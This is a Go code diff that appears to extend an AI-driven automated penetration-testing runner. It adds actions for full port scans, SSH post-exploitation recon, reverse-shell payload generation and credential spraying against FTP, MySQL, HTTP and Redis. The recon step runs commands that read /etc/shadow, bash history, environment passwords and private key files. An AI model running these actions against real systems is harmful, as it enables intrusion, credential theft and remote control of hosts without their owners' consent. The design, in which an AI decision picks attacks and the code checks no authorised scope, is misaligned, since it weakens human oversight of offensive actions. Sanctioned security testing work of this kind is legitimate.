@@ -208,6 +208,14 @@ func (r *AutoRunner) executeAction(ctx context.Context, decision *AIDecision) (*
 		return r.actionCmdInject(ctx, action, decision)
 	case "sqli_exploit":
 		return r.actionSQLiExploit(ctx, action, decision)
+	case "full_scan":
+		return r.actionFullScan(ctx, action, decision)
+	case "ssh_recon":
+		return r.actionSSHRecon(ctx, action, decision)
+	case "reverse_shell":
+		return r.actionReverseShell(ctx, action, decision)
+	case "cred_spray":
+		return r.actionCredSpray(ctx, action, decision)
 	default:
 		action.Result = fmt.Sprintf("Unknown action: %s", decision.Action)
 		action.Success = false
@@ -971,4 +979,357 @@ func parsePorts(s string) []int {
 		}
 	}
 	return ports
+}
+
+// actionFullScan scans all 65535 ports with high concurrency
+func (r *AutoRunner) actionFullScan(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	target := decision.Target
+	if target == "" {
+		target = r.state.Target
+	}
+
+	host, err := r.scanner.FastFullScan(ctx, target)
+	if err != nil {
+		action.Result = fmt.Sprintf("Full scan failed: %v", err)
+		action.Success = false
+		return action, err
+	}
+
+	// Update state with discovered ports
+	sshPorts := []int{}
+	for _, port := range host.Ports {
+		if port.State == "open" {
+			r.state.OpenPorts = append(r.state.OpenPorts, PortInfo{
+				Host:     target,
+				Port:     port.Number,
+				Protocol: port.Protocol,
+				State:    port.State,
+			})
+
+			r.state.Services = append(r.state.Services, ServiceInfo{
+				Host:    target,
+				Port:    port.Number,
+				Name:    port.Service.Name,
+				Product: port.Service.Product,
+				Version: port.Service.Version,
+			})
+
+			// Track SSH ports
+			if port.Service.Name == "ssh" {
+				sshPorts = append(sshPorts, port.Number)
+			}
+		}
+	}
+
+	// Add host to discovered hosts
+	r.state.DiscoveredHosts = append(r.state.DiscoveredHosts, HostInfo{
+		IP:       host.IP,
+		Hostname: host.Hostname,
+		Status:   host.State,
+	})
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("Full scan of %s - %d open ports found\n", target, len(host.Ports)))
+
+	// Highlight SSH services
+	if len(sshPorts) > 0 {
+		sb.WriteString(fmt.Sprintf("  [!] SSH services found on ports: %v\n", sshPorts))
+	}
+
+	for _, port := range host.Ports {
+		if port.State == "open" {
+			sb.WriteString(fmt.Sprintf("  %d/%s - %s", port.Number, port.Protocol, port.Service.Name))
+			if port.Service.Product != "" {
+				sb.WriteString(fmt.Sprintf(" (%s)", port.Service.Product))
+			}
+			sb.WriteString("\n")
+		}
+	}
+
+	action.Result = sb.String()
+	action.Success = len(host.Ports) > 0
+	action.Data["host"] = host
+	action.Data["ssh_ports"] = sshPorts
+
+	return action, nil
+}
+
+// actionSSHRecon performs post-exploitation reconnaissance after SSH access
+func (r *AutoRunner) actionSSHRecon(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	if err := r.framework.Use("exploit/multi/ssh/sshexec"); err != nil {
+		action.Result = fmt.Sprintf("Module error: %v", err)
+		action.Success = false
+		return action, err
+	}
+
+	module := r.framework.Current()
+
+	// Parse target
+	target := decision.Target
+	port := "22"
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		target = parts[0]
+		port = parts[1]
+	}
+
+	module.SetOption("RHOSTS", target)
+	module.SetOption("RPORT", port)
+
+	username := getOpt(decision.Options, "username")
+	password := getOpt(decision.Options, "password")
+
+	if username == "" || password == "" {
+		action.Result = "SSH recon requires username and password"
+		action.Success = false
+		return action, nil
+	}
+
+	module.SetOption("USERNAME", username)
+	module.SetOption("PASSWORD", password)
+
+	// List of recon commands to demonstrate impact
+	reconCommands := []struct {
+		cmd  string
+		desc string
+	}{
+		{"id && whoami", "Current User Info"},
+		{"uname -a", "System Information"},
+		{"cat /etc/passwd | head -20", "User Accounts"},
+		{"cat /etc/shadow 2>/dev/null | head -10 || echo 'No access to shadow'", "Password Hashes (if root)"},
+		{"ls -la /home/", "Home Directories"},
+		{"cat /etc/hosts", "Network Hosts"},
+		{"netstat -tulpn 2>/dev/null || ss -tulpn", "Listening Services"},
+		{"ps aux | head -20", "Running Processes"},
+		{"cat /etc/crontab 2>/dev/null", "Scheduled Tasks"},
+		{"find /home -name '*.txt' -o -name '*.conf' -o -name '*.key' -o -name '*.pem' 2>/dev/null | head -20", "Sensitive Files"},
+		{"cat ~/.bash_history 2>/dev/null | head -30", "Command History"},
+		{"env | grep -i pass || echo 'No password in env'", "Environment Variables"},
+	}
+
+	var sb strings.Builder
+	sb.WriteString(fmt.Sprintf("\n=== POST-EXPLOITATION RECON ON %s:%s as %s ===\n\n", target, port, username))
+
+	for _, recon := range reconCommands {
+		module.SetOption("CMD", recon.cmd)
+		result, err := module.Run(ctx)
+
+		sb.WriteString(fmt.Sprintf("--- %s ---\n", recon.desc))
+		if err != nil {
+			sb.WriteString(fmt.Sprintf("Error: %v\n", err))
+		} else if result.Output != "" {
+			sb.WriteString(result.Output)
+			sb.WriteString("\n")
+		} else {
+			sb.WriteString("(no output)\n")
+		}
+		sb.WriteString("\n")
+	}
+
+	// Add critical finding
+	r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+		Type:        "ssh_compromise",
+		Severity:    "critical",
+		Target:      fmt.Sprintf("%s:%s", target, port),
+		Description: fmt.Sprintf("Full SSH access gained as '%s' - system reconnaissance completed", username),
+		Evidence:    sb.String(),
+		Remediation: "Change compromised password, review SSH authentication settings, implement key-based auth",
+		Timestamp:   time.Now(),
+	})
+
+	// Add session
+	r.state.Sessions = append(r.state.Sessions, SessionInfo{
+		ID:       fmt.Sprintf("ssh-recon-%d", len(r.state.Sessions)+1),
+		Type:     "ssh",
+		Target:   fmt.Sprintf("%s:%s", target, port),
+		User:     username,
+		Platform: "linux",
+	})
+
+	if r.callbacks.OnFinding != nil {
+		r.callbacks.OnFinding(Finding{
+			Type:        "ssh_compromise",
+			Severity:    "critical",
+			Target:      fmt.Sprintf("%s:%s", target, port),
+			Description: fmt.Sprintf("SSH shell obtained as %s - recon completed", username),
+		})
+	}
+
+	action.Result = sb.String()
+	action.Success = true
+	action.Data["username"] = username
+	action.Data["recon_output"] = sb.String()
+
+	return action, nil
+}
+
+// actionReverseShell generates reverse shell payloads for all supported shell types
+func (r *AutoRunner) actionReverseShell(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	if err := r.framework.Use("exploit/multi/handler"); err != nil {
+		action.Result = fmt.Sprintf("Module error: %v", err)
+		action.Success = false
+		return action, err
+	}
+
+	module := r.framework.Current()
+
+	// Get LHOST and LPORT from options
+	lhost := getOpt(decision.Options, "lhost")
+	lport := getOpt(decision.Options, "lport")
+
+	if lhost == "" {
+		lhost = "127.0.0.1" // Default to localhost
+	}
+	if lport == "" {
+		lport = "4444" // Default port
+	}
+
+	module.SetOption("LHOST", lhost)
+	module.SetOption("LPORT", lport)
+	module.SetOption("RHOSTS", decision.Target)
+
+	result, err := module.Run(ctx)
+	if err != nil {
+		action.Result = fmt.Sprintf("Reverse shell generation failed: %v", err)
+		action.Success = false
+		return action, err
+	}
+
+	// Add finding about available reverse shell payloads
+	r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+		Type:        "reverse_shell_ready",
+		Severity:    "info",
+		Target:      decision.Target,
+		Description: fmt.Sprintf("Reverse shell payloads generated for %s:%s", lhost, lport),
+		Evidence:    result.Output,
+		Remediation: "These payloads can be used with command injection vulnerabilities",
+		Timestamp:   time.Now(),
+	})
+
+	action.Result = result.Output
+	action.Success = result.Success
+	action.Data["lhost"] = lhost
+	action.Data["lport"] = lport
+	action.Data["payloads"] = result.Data["payloads"]
+
+	return action, nil
+}
+
+// actionCredSpray tries credentials on various services (FTP, MySQL, HTTP, Redis)
+func (r *AutoRunner) actionCredSpray(ctx context.Context, action *Action, decision *AIDecision) (*Action, error) {
+	username := getOpt(decision.Options, "username")
+	password := getOpt(decision.Options, "password")
+	service := getOpt(decision.Options, "service")
+
+	if username == "" || password == "" || service == "" {
+		action.Result = "Credential spray requires username, password, and service"
+		action.Success = false
+		return action, nil
+	}
+
+	// Parse target
+	target := decision.Target
+	port := ""
+	if strings.Contains(target, ":") {
+		parts := strings.Split(target, ":")
+		target = parts[0]
+		port = parts[1]
+	}
+
+	var modulePath string
+	switch service {
+	case "ftp":
+		modulePath = "auxiliary/scanner/ftp/ftp_login"
+		if port == "" {
+			port = "21"
+		}
+	case "mysql":
+		modulePath = "auxiliary/scanner/mysql/mysql_login"
+		if port == "" {
+			port = "3306"
+		}
+	case "http":
+		modulePath = "auxiliary/scanner/http/http_login"
+		if port == "" {
+			port = "80"
+		}
+	case "redis":
+		modulePath = "auxiliary/scanner/redis/redis_login"
+		if port == "" {
+			port = "6379"
+		}
+	default:
+		action.Result = fmt.Sprintf("Unsupported service for credential spray: %s", service)
+		action.Success = false
+		return action, nil
+	}
+
+	if err := r.framework.Use(modulePath); err != nil {
+		action.Result = fmt.Sprintf("Module error: %v", err)
+		action.Success = false
+		return action, err
+	}
+
+	module := r.framework.Current()
+	module.SetOption("RHOSTS", target)
+	module.SetOption("RPORT", port)
+	module.SetOption("USERNAME", username)
+	module.SetOption("PASSWORD", password)
+	module.SetOption("STOP_ON_SUCCESS", "true")
+
+	result, err := module.Run(ctx)
+	if err != nil {
+		action.Result = fmt.Sprintf("Credential spray failed: %v", err)
+		action.Success = false
+		return action, err
+	}
+
+	if result.Success {
+		// Add finding
+		r.state.Vulnerabilities = append(r.state.Vulnerabilities, Finding{
+			Type:        "credential_reuse",
+			Severity:    "high",
+			Target:      fmt.Sprintf("%s:%s", target, port),
+			Service:     service,
+			Description: fmt.Sprintf("Password reuse detected - %s credentials work on %s", username, service),
+			Remediation: "Use unique passwords for each service, implement credential rotation",
+			Timestamp:   time.Now(),
+		})
+
+		// Add credential
+		cf := CredentialFind{
+			Username: username,
+			Password: password,
+			Service:  service,
+			Target:   fmt.Sprintf("%s:%s", target, port),
+		}
+		r.state.Credentials = append(r.state.Credentials, cf)
+
+		if r.callbacks.OnCredential != nil {
+			r.callbacks.OnCredential(cf)
+		}
+
+		if r.callbacks.OnFinding != nil {
+			r.callbacks.OnFinding(Finding{
+				Type:        "credential_reuse",
+				Severity:    "high",
+				Target:      fmt.Sprintf("%s:%s", target, port),
+				Description: fmt.Sprintf("Credential reuse: %s works on %s", username, service),
+			})
+		}
+	}
+
+	action.Result = result.Output
+	if action.Result == "" {
+		if result.Success {
+			action.Result = fmt.Sprintf("SUCCESS: %s:%s works on %s:%s", username, password, service, port)
+		} else {
+			action.Result = fmt.Sprintf("FAILED: %s credentials rejected by %s:%s", username, service, port)
+		}
+	}
+	action.Success = result.Success
+	action.Data["service"] = service
+	action.Data["username"] = username
+
+	return action, nil
 }
